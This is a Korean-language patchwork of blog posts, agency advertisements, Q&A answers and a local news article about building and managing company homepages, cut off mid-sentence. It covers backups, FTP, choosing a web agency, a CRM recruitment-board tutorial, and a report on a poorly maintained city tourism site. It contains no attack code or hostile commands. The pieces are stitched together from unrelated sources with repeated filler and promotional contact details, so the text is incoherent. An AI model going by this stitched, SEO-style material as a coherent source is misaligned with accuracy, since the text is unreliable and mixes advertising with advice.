차별화된 마케팅 전략을 펼치기 위해 노력하고 있으며,온라인 홈페이지를 계획할 때는 홍보용으로 활용될 것인지, 판매용으로 사용할 것인지 홈페이지의 용도와 목적을 정확히 정한 후, 메뉴 구성과 컨텐츠를 배분하는 것이 좋습니다.무료 계정으로 홈페이지를 열면, 개인 ID와 인터넷 주소를 부여 받게 되는데, 이 경우 업체 출처로 주소가 설정되거나 주소 길이가 길다는 단점이 있습니다.홈페이지 빌더 형식의 솔루션을 이용하면 관리자 툴을 통해서 텍스트, 이미지를 수정횟수에 제한없이 유지, 수정 할 수 있다는 매력이 있습니다.홈페이지를 만들 때에는 주제가 구체적인 나만의 웹사이트를 기획해야 하는데, 그러기 위해서 홈페이지에 업로드할 정보를 상시 기억하기 쉽게 모아 정리해두어야 합니다. 홈페이지 관리 중 컨텐츠나 페이지를 부주의로 지웠을 때를 대비하여 백업 작업은 필수입니다.홈페이지를 확실히 백업해 두었다면 자유롭게 복구가 가능합니다.전체 사이트에서 FTP 파일 전송 시스템을 서비스하는 것은 아니기 때문에 먼저 서비스 제공여부를 확인해 보는 것이 권장됩니다.어느 정도 회사 규모가 있는 웹호스팅 업체는 자체 백업 프로세스가 있으므로업체 결정 시 고려하시기 바라며홈페이지가 해킹되어 문제가 생겨났을 때에는 백업 파일을 불러와 복원이 가능합니다.따라서 사이트를 관리 하신다면 백업은 꼭 지속해서 진행되어야 합니다.홈페이지에 자료를 등록할 때 별도 FTP 프로그램을 쓰는데, FTP(File Transfer Protocol)이란, 인터넷 서비스 중에 한 가지로 Internet의 일반 파일 전송 Protocol입니다. 감각적이고 고객의 주목을 받을 수 있는 웹디자인을 원하신다면 디자인팩토리를 찾아주세요.디자인팩토리는 웹사이트부터 모바일 앱, 모바일어플 등 IT 기반의 디자인 솔루션을 제공하는디자인전문업체로 많은 고객으로부터 사랑받고 있습니다.한 획의 글자, 하나의 점에도 생각하고 또 생각하며 제작하고 있으며 소비자가 사용하기 편하고인상깊은 업체가 될 수 있는 효율적인 디자인을 지향하고 있습니다.마케팅적 지식과 디자인적 노하우로 만족도 높은 디자인을 제작해 드리겠습니다.인생은 가까운 자리에서 보면 비극이지만 먼 자리에서 보면 희극이라고 하죠.오늘 하루 힘드셨다고요? 그렇다면 잠깐 멀리서 자신을 바라보세요.오늘의 고통스러운 시간이 훗날 좋은 기억으로 남을지도 모르니 말이죠. ^^저는 다음 시간에 더 재미있는 홈페이지제작및관리 관련 정보로 돌아오겠습니다! 네이버 블로그는 맞지만, 확인불가 홈페이지관리방법,홈페이지관리업체,홈페이지유지보수,홈페이지관리문의대부분의 기업들이 홈페이지를 통해 기업 홍보활동을 하고 계신데요!한번 제작된 홈페이지를 꾸준히 오래 사용할 수 있는 방법은 무엇일까요???바로 꾸준한 홈페이지 관리입니다!홈페이지를 어떻게 관리하느냐에 따라 오래사용 할 수도 있고, 방치형 홈페이지가 될 수도 있습니다.홈페이지관리업체에 맡기든 직접 관리자가 관리하든 꾸준히 업데이트 되어야 하는데요!오늘은 홈페이지 관리방법에 대해 알려드리겠습니다^^홈페이지 직접관리 vs 홈페이지 제작업체 관리과연어떤것이 더 효율적일까요?!사실 홈페이지를 손쉽게 수정하고, 관리하기위해서는 홈페이지 제작부터 제대로 이루어져야 합니다.수정이 간편하고, 관리하기 쉽도록 기초가 제작되어야 오래사용할 수 있습니다.때문에 최근 제작되는 홈페이지들은 모두 "맞춤형홈페이지" 라는 제작방법으로 홈페이지가 개설되는데요!관공서,대기업 들이 탬플릿형으로 제작되는것..보셨나요?절대아닙니다~ 비용을 더 투자하더라도 퀄리티와 관리, 기능을 위해서 맞춤형으로 제작하시는건데요!맞춤형으로 홈페이지를 제작하시는건 업체에 관리를 맞기지 않으셔도 직접 관리하실 수 있도록 프로그램을 개발해 드린다는 이야기 입니다.때문에 별도의 관리비가 들어가지 않고 직접 컨트롤하고 싶은 영역만 말씀해주시면 관리자모드에 프로그램을 개발해 드립니다.직접 관리하는 홈페이지가 자주 업데이트될 수 있고 오래 사용할 수 있습니다.가끔 기업 홈페이지를 들어가 보시면 게시물이 1년전이 마지막이고, 더이상 홈페이지가 활용되지 않는듯한 느낌적인 느낌..?을 받으신적 있으실텐데요!그럼 기업이미지도 떨어져보이고 뭔가 꺼려집니다~그만큼 홈페이지는 기업 이미지를 판가름하는 공간입니다.제대로된 홈페이지가 제대로된 기업이미지를 만들어 주겠죠?^^높은 퀄리티의 제대로된 홈페이지! 이제 감각디자인과 함께하신는건 어떠세요?^^홈페이지를 제작하려는데 어떻게 해야할까요?프리랜서? 솔루션? 업체?가장 안전한건 제작전문 업체에 의뢰하시는거겠죠?그렇다면 믿을 수 있는 안전한 홈페이지제작업체는 어떤곳을 말하는걸까요?오늘 포스팅을 보신다면 제대로된 홈페이지 제작업체를 선정하실 수 있습니다!1.법인업체인지 확인하라!홈페이지 제작업체중 법인업체를 선정하셔야 믿을 수 있습니다.최근 홈페이지 제작업체가 무수히 많이 늘어나고 있고, 신생업체가 많은만큼 법인회사 위주로 알아보셔야 홈페이지를 끝까지 제대로 제작하실 수 있습니다.2.업력 10년의 베테랑업체와 진행하라!업력 10년이상된 베테랑업체와 진행하셔야 처음 진행하시는 분도 믿고 맡기실 수 있습니다.다양한 디자인적 제안, 기능적 제안을 받으실 수 있기 때문이죠.또 업력만큼 다양한 홈페이지를 제작해본 경험이 있을테니 많은 도움을 받으실 수 있겠죠?3.방문미팅이 가능한지 확인하라!대부분의 홈페이지제작업체들이 서울에 많이 몰려있습니다.서울에 있는 업체들과 진행을 하시려면 한번 얼굴을 보고 진행하시는게 좋은데요!사업장으로 방문미팅이 가능한지 확인해 보시고 지방쪽에 계셔서 방문이 어렵다면 직접 업체로 찾아가미팅할 수 있는지도 확인해 보세요~미팅이 가능한 업체가 그만큼 자신감이 있다는 것이겠죠?위 세가지 사항만 확인하셔도 제대된 홈페이지제작업체를 만나실 수 있습니다^^홈페이지제작업체 선정 이제 어렵지 않으시죠?#홈페이지제작문의 #홈페이지제작업체 #홈페이지제작의뢰 #홈페이지제작회사 #홈페이지제작금액 #홈페이지제작업체추천 #홈페이지제작상담 #홈페이지제작견적 #홈페이지제작비용 #기업홈페이지제작 #쇼핑몰홈페이지 #홈페이지디자인 #홈페이지만들기 #홈페이지개편 #홈페이지리뉴얼 #홈페이지수정 #홈페이지관리 #홈페이지만드는법 #홈페이지제작프로그램 #홈페이지개발 #웹에이전시 #홈페이지유지보수 #홈페이지제작전문 #모바일홈페이지제작전문 #맞춤형홈페이지제작 #제조업홈페이지제작▼▼ 감각디자인 홈페이지 바로가기 click! ▼▼▼▼ 홈페이지제작 전문업체 바로가기 ▼▼ 홈페이지제작업체 여긴 알고가자!8월 1일부터 15일까지 선착순 1,000명 완전 무료!중소상공인을 위한 한국형 반응형 홈페이지를제작비용과 호스팅비 모두 무료로 제공하는 홈페이지제작업체!http://www.ezonm.com/ 요즘 어떤 업종이든지 온라인 마케팅은 필수적이죠.다양한 마케팅방법이 있지만, 가장 기본이 되는 것은홈페이지를 통해 고객들에게 어떤 메뉴가 있는지혹은 어떤 서비스를 제공하는지를 한눈에 보여주는 것입니다.하지만 기존의 방식은 제작비용 부담과 호스팅비용 등으로사업을 시작하는 단계에서 함께 제작하기는 어려운 부분이 있었습니다.그래서 이존엠에서는 중소상공인을 지원하기 위한 반응형홈페이지를업종별 상관없이 무료 제작해주고 있네요 :)홈페이지를 제작하는 방법은 위와 같습니다!사이트에 들어가서 홈페이지 제작을 신청하시면 되는데요.상세한 무료제공 내용을 정리해볼게요.1) 템플릿 1회 선택 무료2) 제작비용 무료3) 호스팅비 무료추가적으로 13일 부터 매주 토요일에 무상교육으로홈페이지 관리 등에 관한 강의를 제공한다고 하니,홈페이지제작업체를 알아보시는 분들은 이존엠을 주목해야겠네요 :)홈페이지제작업체로 이존엠은 위와 같은 디자인의홈페이지를 제작해드리는데요. 계속해서 템플릿이 추가될 예정이니지속적으로 많은 관심을 가지고 보시면 좋을 것 같아요.이존엠은 홈페이지 제작 이외에도 홍보영상을 제작해주거나홈페이지 이동이 용의한 지역업소 QR코드 프레임 등을제작하는 부가서비스도 저렴한 가격에 제공하고 있는데요.더 많은 기회를 활용해서 온라인 홍보에 박차를 가하시면결과로서도 보답받을 수 있지 않을까요 :)단 10분만에 만들 수 있는 간편한 나만의 홈페이지를홈페이지제작업체 이존엠과 함께 무료로 제작해보세요!여러분들의 사업이 활짝 날개를 피는 날이 오기를.그리고 더 많이 웃는 날들이 오기를 바랍니다 :)  네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가 기업체에서 마케팅을 대행사에 맡기는 경우가 많지만, 홈페이지 관리는 의외로 자체적으로 해결하는 경우를 종종 볼 수 있다. 그러나 홈페이지 관리 또한 전문가의 손을 거치는 것이 좋다. 왜일까?​​    @ 온라인상에서어떻게 '상품'을 전시할 것인가 기업의 홈페이지는 오프라인에서의 매장, 그 중에서도 본사와 같다. 따라서 기본적인 상품 및 서비스, 해당 업체에 대한 모든 정보가 수록되어 있어야 한다. 이는 업주가 채워 넣어야 할 기업 홈페이지의 필수 컨텐츠이다.그러나 단순히 아이템을 나열해 놓는 것으로는 홈페이지의 기능을 100% 끌어올릴 수 없다. 판매 중인 상품과 서비스에 대한 나열을 하더라도 '어떻게' 전시하느냐에 따라서 고객들의 반응이 달라진다는 것은 굳이 설명하지 않아도 될 정도로 당연한 사실이다. 하나를 놓더라도 어떻게 강조할 것인지, 어떻게 다른 업체와 차별화된 점을 강조할 것인지 고민해야 한다.  이러한 상품 배치는 고객층의 성향을 고려해서 결정되어야 한다. 빠른 상담이 필요한 금융회사 / 어르신들을 위한 건강식품 위주로 판매하는 온라인 쇼핑몰 / 가맹점을 모집하는 프랜차이즈 사업체가 모두 다른 구성의 홈페이지를 갖고 있어야 한다는 것은 누구든 공감할 사항이다. 이 각각의 회사들은 상품을 소개하는 방식도 달라져야 한다. 40대들이 많이 방문하는 사이트인데 자잘한 글씨체와 통신체가 남발한다면 구매율이 현저히 떨어질 것이다.​​​​​   @ 상품과 서비스만 전시해서는 안 된다 위에서 말했듯이 업체의 홈페이지는 곧 얼굴이며, 본사 매장과 같은 역할을 한다. 따라서 전문성이 드러나야 한다. 상품과 직접 관련된 내용이 아니더라도 분야에 있어서 전문성을 보이면 고객들에게 신뢰감을 얻을 수 있다. 카메라 판매 홈페이지인데 뛰어난 감각의 사진 작품을 전시해 놓으면 신뢰도가 상승하는 것과 마찬가지이다. 순대국 매장이더라도 순대의 효능에 대해 기재해 둔다면 상품 자체에 대한 신뢰도를 높일 수 있다. 그러나 이러한 부가적이고 정보를 제공하는 컨텐츠의 경우, 직접적인 광고를 피하는 것이 좋다. 단지 정보를 얻기 위해 홈페이지에 접속하는 간접 소비자가 있을 수 있기 때문이다. 이러한 간접 소비자의 경우는 자연스럽게 정보를 제공해 주면서 브랜드를 기억하게 하는 방식을 택해야 한다.   ＃＃＃  홈페이지 관리는 녹녹하게 보아서는 안 될 부분이다. 아무리 상품이나 서비스가 뛰어난 업체라 하더라도 전시를 제대로 하지 못한다면 소용이 없다. 또한 신디케이션을 통해서 검색 결과에 보이도록 하는 기술적인 작업도 필요하다.  따라서 온라인상에서 확실하게 매장구축을 원한다면 전문적인 마케팅 컨설팅 후에 꼼꼼하게 컨셉을 잡고 홈페이지를 구축하도록 하자.​​​​​​애드스토리 온라인 마케팅 상담 : 031-709-1095       '채용 관리  - 홈페이지 관리 ⑦'  ﻿저번 포스팅 ' [홈페이지 관리] 기업 관리- 홈페이지 관리 ⑥ ' 에서는﻿﻿동문들이 소속하고 있는 기업의 등록과 기업 소개, 연혁 등 상세 내용을 입력하는 방법에 대해서 알아보았는데요,이어서 이번에는 등록된 기업의 동문들을 대상으로 한 채용 등록에 대해 알아보도록 하겠습니다.채용 게시판은 당사의 채용 공고를 알리고, 지원자는 채용공고 열람 및 직접 이력서까지 작성할 수 있는 페이지 입니다.이번에도 마찬가지로 명지대학교 총동문회 홈페이지를 예시로 설명드리겠습니다.^^ 1.홈페이지 메뉴 등록하기 [홈페이지관리] 메뉴 → [홈페이지메뉴관리] 메뉴를 클릭합니다. 왼쪽의 메인 메뉴를 선택한 뒤,그 메인 메뉴의 서브 메뉴를 만들기 위해 우측 상단의 '등록' 버튼을 클릭합니다.   '등록' 버튼을 클릭하면 아래와 같이 팝업 창이 뜨는데요,좌측의 2nd 메뉴 유형에서 '채용안내'를 선택합니다. 오른쪽의 내용을 모두 작성한 뒤 '저장' 버튼을 클릭합니다.  홈페이지에 '채용안내' 메뉴가 추가되었습니다.  당사의 채용 정보를 등록하기 위해 officeCRM Standard 프로그램을 엽니다. [업무관리] 메뉴 → [채용관리] 메뉴 → [채용등록] 메뉴를 클릭합니다. 채용등록 화면입니다.채용 기업명을 검색 후, 해당 기업명을 더블클릭합니다.   기업명을 더블클릭하면 기 란에 해당 기업의 기업명이 표시됩니다.   모집분야, 모집기간, 모집인원, 제목, 내용 등 입력한 후'저장' 버튼을 클릭합니다.  다시 officeCRM 프로그램 상단메뉴의 [업무관리] 메뉴 → [채용관리] 메뉴 → [채용목록] 메뉴를 클릭하면'채용목록'에 아래와 같이 등록한 채용공고가 목록에 나옵니다.  아래와 같이 홈페이지에 등록한 채용공고가 게시된 것을 확인하실 수 있습니다. 홈페이지 채용안내 게시판에 게시된 '채용공고' 게시글을 통하여 지원자가 온라인으로 이력서를 작성하여 제출할 수 있습니다.채용 기간에 따라 채용이 마감되기 전 기간 동안에는 '채용상세' 화면 하단의 '입사지원하기' 버튼이 보여지며채용기간이 마감된 후에는 '입사지원하기' 버튼이 보이지 않습니다.  '입사지원하기' 버튼을 클릭하면 이력서 양식 페이지로 이동합니다.입사지원자는 이력서 양식을 작성하여 온라인으로 이력서를 제출할 수 있습니다.작성이 완료된 후 '저장' 버튼을 클릭합니다.  2.온라인 지원자 목록 확인하기 온라인 지원자가 제출한 이력서를 확인하기 위해 [업무관리] 메뉴 → [채용관리] 메뉴 → [이력서목록] 메뉴를 클릭합니다. 이력서 목록 팝업창이 뜹니다.기업명 선택 후 '검색' 버튼을 클릭하면 제출된 이력서 목록을 확인할 수 있습니다.지원자의 이름을 더블클릭하여 이력서 수정화면으로 이동할 수 있어 수정도 가능합니다. 이력서 검토 후 지원자의 합격여부를 관리할 수 있습니다.해당 지원자의 채용결과 칸을 더블클릭합니다.  해당 지원자의 채용결과를 선택합니다.  각 지원자 별로 채용결과를 확인할 수 있습니다.     일반기업 홈페이지에서 채용공고를 알리는 게시판은 쉽게 찾아볼 수 있는데요하지만 지원자가 직접 이력서를 작성하여 제출 할 수 있는 기능은 거의 찾아 볼 수 없습니다. 기업에서도 잡XXX,사람X등의 채용 사이트를 통하여 받은 온라인 이력서로 관리 하는 시스템이기 때문에이력서를 관리 하기 어렵게 됩니다. 하지만 officeCRM과 함께하면  채용공고,지원자 이력서관리를 쉽게 하실 수 있습니다^^        이와같이 채용관리 게시판을 이용한다면지원자는 간편하게 이력서를 작성할 수 있으며,또한 필기 문서 형태의 이력서를 제출해도당사에서 프로그램으로 간편하게 등록할 수 있기 때문에 시간 대비 효율성을 늘릴 수 있습니다.^^채용결과는 프로그램을 통하여 담당자가 지원자에게 SNS나 별도의 연락을 통해통보가 가능합니다.          [홈페이지관리[홈페이지관리[홈페이지관리[ 홈페이지 관리에 관해서요...홈페이지 관리에 대해 잘 몰라 몇가지 질문할께요1. 먼저 기존에 있던 홈페이지에서 베너광고나 링크를 달려고 합니다.그럼 ftp에서 바꾸는게 아니라 드림위버에서 바꾸는 건가요?2. 또한 게시판 관리같은것도 ftp프로그램에서 하는건가요?3. 기업의 홈페이지도 알ftp로 하나요?4. 일단 홈페이지 관리는 대게 어느 프로그램에서 하나요?5. 홈페이지 관리는 대부분 게시판 관리나, 이벤트 이런걸 업데이트하고 관리하는건가요  1.홈페이지에 배너광고나 링크를 달려고 하신다면...   말씀하신 드림위버라는 인코딩 프로그램을 통해서 해당 파일(주로 index.html)파일을 수정해주시고   수정하신 파일을 ftp를 통해 올리는 것이랍니다. 2. 게시판관리는 각 서버제공업체나 아니면 해당 홈페이지를 제작하신 분께서 어떻게 만드셨는냐에 따라    조금은 달라지겠지만 대부분의 경우 홈페이지에 admin으로 아이디를 가진분께서 게시판관리를 할 수    있도록 프로그램을 짜는 것으로 알고 있습니다. 관리자 접속(admin)을 하시면 게시판관리가 필요하죠. 3. ftp종류는 여러가지가 있습니다. 알ftp를 이용할 수도 있고 다른 ftp프로그램을 쓸 수도 있죠. 4. 홈페이지 관리는 먼저 말씀드린 것처럼 처음 만들어주신 분께서 어떻게 제작을 하셨는지에 따라서    달라집니다. 사용자가 편리하게 작업하실 수 있도록 위젯을 이용한 경우도 있겠고 아니면 하나하나    페이지를 코딩해서 새롭게 리뉴얼 해야하는 경우도 있고요. 페이지 전체를 변화시켜 주시려면....    대부분... 포토샵이나 플래쉬를 이용해서 이미지 제작을 하시고.... 드림위버로 html문서을 만들어 주시면    될 것 같습니다. 5. 말씀하신대로 게시판관리나 이벤트도 업데이트하고 홍보를 원하시는 제품이나 내용을 바꾸어주시고   계절별로 시각적인 효과를 바꾸어주시는 것도 포함될 것 입니다.    작은 제조업체입니다.현재는 홈페이지를  웹호스팅사용비-12만원, 서버관리비 -24만원을 지불하고 사용하고 있습니다.이번기회에 비용절감을 위하여 회사에서 직접 관리하고 싶은데 방법을 알고 싶습니다.1. 현재의 홈페이지 관리 비용의 적정성 여부2. 직접 관리를 위한 필요한 하드웨어 및 소프트웨어3. 직접관리를 위한 상세한 방법 여러분의 좋은 의견 기다리겠습니다. 감사합니다.   현재 유지비가 월단위 금액이겠죠?사이트 주소를 알려주시면 더 정확히 볼수있을텐데요.. 1. 현재의 홈페이지 관리 비용의 적정성 여부- 제조업체라고 하셨는데 쇼핑몰처럼 회원이 많거나 상품이미지 수정등의 일이 많은지 궁금합니다.일단 ****호스팅 서비스 업체에 호스팅 비용입니다. 절대 광고는 아니고요, 대충 이정도 선입니다. 개인 홈페이지 수준이다 하면은 일반형 정도 추천이고요, 그래도 어느정도 크기가 있다 싶으면 비지니스정도 추천합니다.서버관리비는 솔직히 뭔지 모르겠습니다. 아마 회원관리와 결제, 상품업데이트가 있다면은  비싼 비용은 아니고요, 그런거 없으면은 솔직히 서버관리라는게 호스팅비용에 합쳐져야 한다고 생각합니다. 2. 직접 관리를 위한 필요한 하드웨어 및 소프트웨어- 서버가 필요한데 이건 간단히 말하면 365일 내내 전원이 켜져있는 하드드라이브라고 생각하시면 됩니다. 그래야 아무때나 사용자가 홈페이지에 접속할수가 있습니다. 그런 하드를 빌려주고 관리 해주는게 바로 호스팅입니다.작은 제조업체라고 하셨는데 홈페이지만을 관리하기 위해서 하드웨어나 소프트웨어를 사는건 비추입니다. 전기세도 있지만 서버 가격이 최소 몇백~몇천만원 단위이니 그냥 1번에 있는것처럼 호스팅서비스를 받는게 현명할꺼같습니다. 3. 직접관리를 위한 상세한 방법- 제 예상으로는 디자인업체같은곳에서 싸게 홈페이지만들고 유지보수 계약을 맺은거 같은데요...일단 웹쪽관련해서 지식이 쫌 있어야 하고요,  관리자 페이지가 있다면은 그쪽에 대한 권한을 받으면 좋을꺼같습니다.만약 비용이 너무 비싼거 같다고 해서 옮긴다고 한다면은 그 업체에서 순순히 소스를 오픈할지가 문제내요.. 그게 자기들 밥그릇일텐데요.. 첨에 어떻게 계약했는지가 중요할꺼같습니다.   홈페이지제작 및 관리법을 알아보다가 업채를 알아 보시는 분들이 많습니다 디자이너 프로그래머 배정되면 각각 직통번호로 연락되고 급한경우 핸드폰 연락도 가능하구요.전화로 설명 필요없는 작업은 메일만 보내도 처리가 되구요.유지보수 서비스 받는 업체들은 작업 우선순위가 제작중인 홈페이지 보다 우선해서 처리를 해주는등서비스도 좋고 비용도 작업건당 방식도 있고 월 계약 방식도 있습니다.  홈페이지관리 쉽게 하는 법 ​   ​​​메이크홈즈 지금 주목하라! 홈페이지제작및관리의 숨겨진 지식​알면 알 수록 도움이 되는 홈페이지 백업 관련 정보! 확실하게 이해하기​​나의 삶을 업그레이드시켜 줄 좋은 기회나 행운은 여러 번 찾아오는 것이 아니죠~내 앞에 다가왔을 때 주저하지 말고 확! 낚아채는 것도 상당히 중요한 부분 중 하나에요. ^^지금 여러분과 제가 함께 알아 볼 홈페이지제작및관리 관련 정보도 그렇습니다!여러분 인생에 중요한 행운이나 기회가 될 가능성도 있으니 놓치지 말고 잘 따라오세요~​   ​​홈페이지 디자인을 전문업체에 맡겼을 경우 백업 계약도 약정해 놓으시면 좋은데요.계약 사항에 일정한 기간마다 백업 문서를 제공받기로 명시해 둔다면안전히 보장받을 수 있기 때문입니다.​​홈페이지 제작 완료 후 부족한 부분을 바꿔나가다보면 수정한 부분이 마음에 들지 않아 원상태로 되돌아가고 싶은 경우가 있기 때문에 무조건 백업을 하는 것이 좋습니다.​그리고 홈페이지에 파일을 등록할 때 별도 FTP 프로그램을 활용하는데, FTP(File Transfer Protocol)이란, 인터넷 프로그램의 중 하나로 Internet의 표준 파일 업로드 프로토콜Protocol입니다.​홈페이지가 해킹되어 문제점이 생겼을 때에 백업 파일을 불러와 복구가 가능합니다.따라서 웹사이트를 관리 하신다면 백업은 꼭 지속적으로 진행되어야 합니다.​​   ​자신이 구축한 홈페이지의 계정 공간으로 데이터 파일들을 올린다는 것은 내 PC에 저장되어 있는 파일을 웹 서버에 보내 저장 시키는 것입니다.​​   ​간단히 알아보는 홈페이지 부가서비스​   ​보안서버란 개인 정보의 유출과 해커가 중간에서 데이터를 가로채는 사항을 막고자,인터넷 사용자 개인 자료를 암호화, 복호화하여 전송하는 서버를 말합니다.현재 법적으로 이용자의 개인 정보 보호를 위해, 개인정보를 취급하는 모든 사이트는개인 정보 전송구간에 필수로 보안서버(SSL)를 설치해야 합니다.​부정클릭 차단을 위해 네이버 계정 IP 차단 기능을 이용하는 것이 좋은데요. 네이버 계정에서 관리 도구 그리고 광고 노출 제한 관리를 통해 해당 IP에는 의뢰인의 홈페이지가 나타나지 않도록 만들어줍니다.​​홈페이지 방문자의 행동 양상과 경로, 접속 페이지 등을파악하는 도구로 로그분석 프로그램이 있습니다.​​그리고 전자 결제서비스의 경우, 결제시스템을 통하여 카드결제나 실시간 계좌이체 등을 즉시 확인 할 수 있습니다.또한, 매출의 집계나 결제 기록을 관리할 수 있어서 편리합니다.​​   ​기본적인 솔루션형 홈페이지의 경우, 저렴한 금액으로 제작할 수 있지만디자인이나 팝업창, 텍스트 수정이 어려울 수 있습니다.따라서 업체와 사이트의 특성에 맞게 맞춤 홈페이지 관리가 필요하거나지속적인 관리하기가 필요한 홈페이지의 경우, 맞춤형 서비스를 활용하여 보는 것이 좋습니다​​​   ​​우리 매장을 더 쉽게, 더 효과적으로 홍보하는 방법! 제2의 집인 홈페이지를 제작하세요!비교 불가능한 품질의 로고와 홈페이지를 제작해주는 메이크홈즈가 도와 드립니다!​​업체의 상품과 서비스를 꼼꼼히 분석해 더 보기 쉽게, 더 흥미가 일도록 만들어드리는 곳!인스타그램 등 SNS를 활용한 다양한 광고마케팅도 시행해 홍보효과를 2배로 높여주는 곳!​퀄리티 대비 정직하고 합리적인 견적으로 고객님의 마케팅 비용은 줄여주고!신속정확한 일처리 및 끊임없는 피드백으로 홈페이지 제작 및 광고 만족도는 높여주고!​지금 즉시 메이크홈즈에 전화해 우리 업체를 더 많은 사람들이 볼 수 있게 해 보세요!문의 상담번호 052-267-2027/ 010-3063-7993​   ​좋아하는 영화는 몇 번을 봐도 전혀 지루하지 않고 시간이 훌쩍 흐르고는 해요^^언제나 지루하지 않고 새로운 홈페이지제작및관리에 대한 포스팅을 가져오도록 하겠습니다.오늘 밤에는 가장 좋아하는 영화 한 편을 보면서 편안한 시간 보내세요~​​   안녕하세요, 한국원자력환경공단 블로그지기입니다!저희 한국원자력환경공단에서는 공식 홈페이지와블로그, 페이스북, 트위터, 오픈캐스트, 유투브를 운영하고 있어요~​그중에서도 코라드 홈페이지와 방폐물 관리사업에 관한설문조사 이벤트를 진행합니다!​   ​이번 설문조사 이벤트를 참여하실 분들은아래 이미지를 클릭클릭해주세요​이벤트기간은 12월 15일(월)까지 진행하며,12월 19일(금)에 당첨자를 발표합니다!​국민 여러분의 다양한 목소리를 듣고자 마련한 설문조사에많은 분들의 참여 부탁드립니다♥​​​​▼▼▼▼▼▼​​▼▼▼▼▼▼▼▼▼▼▼▼​▼▼▼▼▼▼   관심집중! [홈페이지 제작 및 관리] 제대로 된 정보 얻어 가세요! 여러분들에게만 특별히 공개하는 홈페이지 코딩 프로그램 꿀정보!    부정적인 사고를 가지면 되려던 것도 안될 수 있다고 해요.불확실한 상황일수록 ‘된다’라는 긍정의 자세가 필요하다고 해요.홈페이지제작및관리 대한 내용도 저와 함께하면 완전정복 할 수 있듯이 말이죠~^^     HTML 코딩을 맡길 경우 작업한 디자인 시안의 PSD 파일과 이미지 파일 그리고 서체를 함께 내야만 합니다.    만약 여러분들께서 홈페이지를 본인이 제작할 때 코딩 방법을 모르신다면,디자인 작업만 개인이 진행한 후 코딩은 코딩 서비스 기업에 맡기셔도 된답니다.일반적으로 HTML 문서에 지은 파일명은 홈페이지를 처음 열어주는 역할을 하는데요. 보통 index.html로 해야 정상적으로 서비스가 되고 일부 홈페이지 무료 계정 업체는 문서 이름을 default. Html로 해야 정상작동하는 경우도 있기 때문에 해당 사이트에서 반드시 살펴봐야 합니다.홈페이지를 제작할 때 중요한 코딩의 사전적 뜻은 ‘부호화한다’는 뜻이에요.컴퓨터 기계에게 말하기 위하여 컴퓨터 언어인 코딩이 항상 필요하답니다.  보통 기획 회사에서 페이지를 만들 때 웹디자이너와 개발자의 협업으로 이루어지는 것인데요. 웹디자이너가 포토샵으로 페이지 모형을 완성하면 개발자가 코딩하여 홈페이지에 등록하게 되죠.    꼼꼼하게 알아보는 홈페이지 제작 업체 선정 이야기!   일반적으로 낮은 가격에 홈페이지를 구축해 주는 웹사이트 중에서는, 홈페이지 관리가 허술하고 회사의 운영이 어려운 경우가 있으니 각별히 주의해야 합니다.    홈페이지 제작은 홈페이지 전문 디자이너부터 홈페이지 기획자, 설계자,개발자에 이르기까지 여러 가지 영역의 전문가들이 협업하여 이루어지죠.또 제작할 경우에는 그 방법과 비용, 기간, 방향이 업체마다 각각 다릅니다.그렇기 때문에 업체가 진행 중인 사업의 지향점을 상세히 전달해야 해요.    고급스러운 홈페이지 제작으로 금액 대비 최고의 효과를 내고 싶은 분에게18년의 오랜 경력을 보유한 드림인터페이스를 추천합니다. 드림인터페이스는 홈페이지/모바일 홈페이지/쇼핑몰 고급형 맞춤 전문 제작회사에요.풍부한 실무 진행 경험의 개발진과 디자이너들이 있어고객 만족 퀄리티로 제작하며, 다양한 요구사항까지 적극 반영해 드립니다! 업체 홈페이지 제작 또는 홈페이지 개편이 요구되는 시점이라면거품 없는 견적을 보장하는 드림인터페이스에 문의해보세요!    “나오는 대로 다 말하지 마라. 체로 거르듯 신경 써서 말해도 불량품이 나오기 마련이다.”     국민 MC 유재석 씨가 전한 명언이라고 해요. 하루에 남에게 전하는 수 마디, 오늘은 한 번    그 내용에 관해 곱씹어봐야겠습니다. 오늘 소개해드린 홈페이지제작및관리 소식에는 불량품이 없길 바라며, 이만 마칠게요! 광명시 문화관광 홈페이지가 엉터리로 관리되고 있는 것이 드러났다. 관계자는 팀 별로 관리하고 있어 주로 관리하는 사람은 없다고 답변했다.광명시가 문화에 관심이 없는 것이 드러났다. 광명시문화관광포털에서 광명시문화예술단체 현황을 공개한 정보가 엉터리인 것이 확인 된 것.광명시문화관광홈페이지를 보면 현재 한국예총광명지회 지부장이 임웅수다. 임웅수 지부장은 올해 초 임기를 끝냈다. 신임 지부장 이취임식에는 문화체육과 관계자들이 참석을 했었다. 신임 지부장은 김유종씨다. 이러한 사실을 자신들이 직접 확인을 하고도 수정을 하지 않았다는 것은 탁상행정을 보여주고 있는 것이다.이 홈페이지는 문화체육과가 관리하는 구조다. 지난 2015년에 개설된 이후 관계자들이 관심을 갖고 관리를 한 것이 아님을 조금만 살펴보면 알 수 있다. 궁금증을 해결할 수 있는 정보를 쉽게 파악할 수가 없다.문화체육과 관계자는 "문화관광 홈페이지는 팀별로 관리를 하고 있다. 각 팀에서 관리하기 때문에 팀으로 연결해서 정보를 얻을 수 있다"고 말했다. 이어 그는 "홈페이지를 주로 관리하는 사람은 없다"고 덧붙였다.이 관계자의 말에 따르면 광명시 문화관광 홈페이지는 책임자가 없이 팀 체제로 나뉘어 알아서 관리한다는 것이다. 즉 자신들과 연관이 없으면 알 수 없는 홈페이지라는 것을 의미한다.부서 관계자와 통화를 하면서 드러난 문제점은 위에서 지적한 엉터리 정보가 나왔다는 것이다. 광명업사이클아트센터 조직도에서 팀장이 이미 지난해에 바뀌었지만 알지도 못하고 있었다. 이에대해 관계자는 홈페이지 관리 업체에서 수정을 해야 하는데 못했다는 핑계를 둘러댔다.중요한 것은 광명시 문화관광 홈페이지에 대해 중요성을 인식하지 못하고 있다는 것이다. 부서 관계자가 말했듯이 관리가 주먹구구식으로 이뤄지고 있는 상태에서 어떻게 발전적인 문화를 기대할 수가 있느냐다.하나를 보면 열을 안다는 속담이 있다. 광명시는 문화에 대해서는 발전을 하고 있는 것이 아니라 퇴보는 물론 폐쇄적으로 이뤄지면서 시궁창에 빠졌다는 표현이 어울릴 듯 하다.이정민 기자  com423@daum.net네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가 홈페이지제작및관리 정보 탐색 이제 나도 홈페이지 제작 업체 선정 전문가!   어제오늘 똑같이 흘러가는 반복되는 일상에 지치셨나요?그런 때일수록 무언가 새로운 것이 필요한 법입니다.오늘 새롭게 살펴보는 